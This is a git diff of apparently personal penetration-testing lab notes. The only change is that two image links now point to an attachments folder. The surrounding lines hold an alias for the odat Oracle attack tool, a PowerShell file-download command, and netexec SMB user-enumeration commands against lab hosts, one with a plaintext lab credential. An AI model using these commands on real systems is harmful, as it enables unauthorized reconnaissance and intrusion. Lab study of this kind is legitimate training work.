@@ -39,7 +39,7 @@ echo "alias odat='/home/antivenom/tools/odat/odat.py'" >> ~/.zshrc
 
 -------------------------file transfer
 
-![[Pasted image 20250912221259.png]]
+![[../attchments/Pasted image 20250912221259.png]]
 
 ```powershell
 Invoke-WebRequest -Uri http://ip/file -OutFile C:\Path\FIlename
@@ -152,7 +152,7 @@ nxc smb administrator.htb -u "Olivia" -p "ichliebedich" --rid-brute
 above commad for user enum
 ```
 
-![[Pasted image 20250912215323.png]]
+![[../attchments/Pasted image 20250912215323.png]]
 
 ```
 netexec smb 10.10.10.192 -u 'somethinng' -p 'somethign' --users 
